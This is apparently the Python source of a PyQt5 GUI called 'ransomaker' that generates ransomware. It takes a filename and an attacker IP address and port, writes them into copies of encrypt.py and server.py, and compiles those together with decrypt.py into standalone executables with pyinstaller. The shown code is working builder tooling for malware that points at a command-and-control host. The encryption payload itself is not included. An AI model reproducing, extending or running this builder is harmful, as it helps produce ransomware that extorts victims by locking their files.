from PyQt5 import QtWidgets
from ransomakerUi import Ui_Form
import sys
import os
import shutil

class App(QtWidgets.QWidget, Ui_Form):
    def __init__(self):
        super(App, self).__init__()
        self.setupUi(self)
        self.pushButton.clicked.connect(self.generate)

    def generate(self):
        filename = self.lineEdit_1.text()
        ip_address = self.lineEdit_2.text()
        port = self.lineEdit_3.text()
        desc = {
            'filename': filename,
            'ip_address': f'"{[ip_address]}"',
            'port': port
        }
        copy_and_update('src/encrypt.py', desc)
        copy_and_update('src/server.py', {**desc, 'filename':'server'})
        convert_to_exe('src/decrypt.py')

def create_directory(root, directory_name):
    path = os.path.join(root, directory_name)
    os.mkdir(path)
    return path
    
def insert_in_first(filepath, content):
    with open(filepath, 'r+') as f:
        lines = f.readlines()
        f.seek(0)
        f.write(content+'\n')
        for line in lines:
            f.write(line)
        f.close()

def convert_to_exe(python_file):
    command = f'pyinstaller --onefile {python_file}'
    # Win
    # os.system(f'cmd /c "{command}"')
    # Linux
    os.system(command)
    if os.path.isdir('build'):
        shutil.rmtree('build')
    
def copy_and_update(src, args):
    current_dir = os.getcwd()
    dest_dir = 'tmp' if os.path.isdir('tmp') else create_directory(current_dir, 'tmp')
    out_file = args['filename'] + '.pyw'
    dest_path = os.path.join(dest_dir, out_file)
    shutil.copy(src, dest_path)
    ip_address = 'IP_ADDRESS = ' + args['ip_address']
    port = 'PORT = ' + str(args['port'])
    insert_in_first(dest_path, port)
    insert_in_first(dest_path, ip_address)
    output_path = f'tmp/{out_file}'
    convert_to_exe(output_path)
    if os.path.isdir('tmp'):
        shutil.rmtree('tmp')

if __name__ == '__main__' :
    app = QtWidgets.QApplication(sys.argv)
    Form = App()
    Form.show()
    sys.exit(app.exec_())